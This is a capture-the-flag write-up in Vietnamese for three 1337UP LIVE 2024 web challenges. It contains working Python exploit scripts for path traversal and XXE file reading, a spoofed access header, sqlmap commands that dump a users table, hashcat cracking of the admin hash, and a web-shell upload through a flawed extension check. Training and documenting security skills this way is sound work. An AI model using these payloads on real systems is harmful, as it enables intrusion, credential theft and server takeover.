# 1337UP LIVE 2024  ctf 

## Pizza Paradise
- vào chall này em thấy chỉ có trang tĩnh html 
- dùng dirsearch em thấy có file robots.txt
- truy cập vào em thấy có ```/secret_172346606e1d24062e891d537e917a90.html```

![image](https://hackmd.io/_uploads/BkR5MPSM1l.png)

![image](https://hackmd.io/_uploads/BJkBfwrzJl.png)


![image](https://hackmd.io/_uploads/SyzXGvBzkg.png)

- em thấy có file auth.js chứa credential 


![image](https://hackmd.io/_uploads/S1eKZwHfyl.png)

```javascript
const validUsername = "agent_1337";
const validPasswordHash = "91a915b6bdcfb47045859288a9e2bd651af246f07a083f11958550056bed8eac";
```

- khi đăng nhập username password sẽ được so sánh với credential này 


![image](https://hackmd.io/_uploads/H10yMvSf1g.png)

tài khoản sẽ được SHA256 và được so sánh với validPasswordHash
- đem crack password và em đăng nhập được vào 

![image](https://hackmd.io/_uploads/SkVB7Prfkl.png)

![image](https://hackmd.io/_uploads/B1SGNvHzkl.png)

- và em biết được source được đặt tại /var/www/html

![image](https://hackmd.io/_uploads/rybRQvrGkg.png)

- đăng nhập xong  để ý em thấy có chức năng download có khả năng khai thác path traversal

![image](https://hackmd.io/_uploads/S1aUdDHzkx.png)


![image](https://hackmd.io/_uploads/HJKSrwSMkg.png)

- đọc source code của endpoint này em được flag 


![image](https://hackmd.io/_uploads/rJcwPPBzyx.png)

```python
import requests
import re

url = 'https://pizzaparadise.ctf.intigriti.io/topsecret_a9aedc6c39f654e55275ad8e65e316b3.php'

payload = "/assets/images/../../../../../../../../var/www/html/topsecret_a9aedc6c39f654e55275ad8e65e316b3.php"

params = {
    "download": payload
}

response = requests.get(
    url, 
    params=params,
)

match = re.search(r"\$flag\s*=\s*'([^']+)'", response.text)
if match:
    flag = match.group(1)
    print(flag)
else:
    print("Flag not found")
```

![image](https://hackmd.io/_uploads/r1gx4OSf1g.png)


## BioCorp
- vào đọc source code em thấy file panel.php có thể khai thác XXE 
- để truy cập trang này thì ứng dụng sẽ check ip_address trong HTTP_X_BIOCORP_VPN bằng 80.187.61.102 không nếu bằng thì mới cho vào page

```php
<?php
$ip_address = $_SERVER['HTTP_X_BIOCORP_VPN'] ?? $_SERVER['REMOTE_ADDR'];

if ($ip_address !== '80.187.61.102') {
    echo "<h1>Access Denied</h1>";
    echo "<p>You do not have permission to access this page.</p>";
    exit;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && strpos($_SERVER['CONTENT_TYPE'], 'application/xml') !== false) {
    $xml_data = file_get_contents('php://input');
    $doc = new DOMDocument();
    if (!$doc->loadXML($xml_data, LIBXML_NOENT)) {
        echo "<h1>Invalid XML</h1>";
        exit;
    }
} else {
    $xml_data = file_get_contents('data/reactor_data.xml');
    $doc = new DOMDocument();
    $doc->loadXML($xml_data, LIBXML_NOENT);
}

$temperature = $doc->getElementsByTagName('temperature')->item(0)->nodeValue ?? 'Unknown';
$pressure = $doc->getElementsByTagName('pressure')->item(0)->nodeValue ?? 'Unknown';
$control_rods = $doc->getElementsByTagName('control_rods')->item(0)->nodeValue ?? 'Unknown';

include 'header.php';
?>
```


![image](https://hackmd.io/_uploads/H1kyg_rzkx.png)

![image](https://hackmd.io/_uploads/rkVfPOrzJg.png)

![image](https://hackmd.io/_uploads/SkVSPdSMyx.png)

```python
import requests
import re

url = 'https://biocorp.ctf.intigriti.io/panel.php'
headers = {
    'Host': 'biocorp.ctf.intigriti.io',
    'X-Biocorp-Vpn': '80.187.61.102',
    'Content-Type': 'application/xml'
}
xml_data = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE reactor [
    <!ENTITY xxe SYSTEM "file:///flag.txt">
]>
<reactor>
    <status>
        <temperature>&xxe;</temperature>
        <pressure>1337</pressure>
        <control_rods>Lowered</control_rods>
    </status>
</reactor>'''

response = requests.post(url, headers=headers, data=xml_data)

# Sử dụng biểu thức chính quy để tìm chuỗi INTIGRITI{...}
flag_pattern = r'INTIGRITI\{[^\}]+\}'
match = re.search(flag_pattern, response.text)

if match:
    print(match.group(0))
else:
    print("Flag not found")
```

![image](https://hackmd.io/_uploads/BJCldurMyl.png)




## Fruitables
- dirsearch em thấy có thêm endpoint /account.php

![image](https://hackmd.io/_uploads/SJJ4_YBMJl.png)


![image](https://hackmd.io/_uploads/BkuuStrz1l.png)

đăng ký và đăng nhập 

![image](https://hackmd.io/_uploads/SkdCrYSGJx.png)

- thấy trang login không validate user data


![image](https://hackmd.io/_uploads/BysFPtHMkx.png)

- ném vào sqlmap em được credential của admin 


```sql
sqlmap -u "https://fruitables-1.ctf.intigriti.io/auth/fruitables_login.php" --data "username=admin&password=admin" --method POST -p "username" -threads=10 --level=5 --risk=3 --batch --dbs
```

![image](https://hackmd.io/_uploads/BJljkqBfye.png)

```sql
sqlmap -u "https://fruitables-1.ctf.intigriti.io/auth/fruitables_login.php" --data "username=admin&password=admin" --method POST -p "username" -threads=10 --level=5 --risk=3 --batch -D public -T users --dump
```

![image](https://hackmd.io/_uploads/S1rgl5rM1e.png)

crack ```$2y$10$Ocs4FthXUxD1MC8DqPtYQ.Ke/1bIYTu7kqiKt4M8jp/mbJfuEjwXC``` em được mật khẩu của admin là ```futurama```

```bash
hashcat -m 3200 -a 0 sql.txt /usr/share/wordlists/rockyou.txt  --force
```

![image](https://hackmd.io/_uploads/S1oN7orzkg.png)



![image](https://hackmd.io/_uploads/r1-0bcSMyg.png)

đăng nhập thành công và em vào trang quản trị có chức năng upload file 

![image](https://hackmd.io/_uploads/rkiXf9Hzkx.png)

- file cho phép upload file với phần mở rộng .jpeg.... và .png.....

ứng dụng có thể sử lý như sau:

```php
 $extension = explode(".", $filename)[1];
        if ($extension != "jpeg" || $extension != "png") {
            die("Only JPEG and PNG files are allowed.");
        }
```

- nó sẽ chỉ lấy giá trị thứ 2 của mảng và so sánh với chuỗi png và jpeg nếu hợp lệ mới cho upload
- từ đó em có thể upload webshell với phần mở rộng ```.png.php```

![image](https://hackmd.io/_uploads/ryQRd5BfJx.png)

- vào đọc file upload lên tại /uploads và em trigger được lỗi 


![image](https://hackmd.io/_uploads/ryYId9BMke.png)

![image](https://hackmd.io/_uploads/rkaY_cBMJx.png)


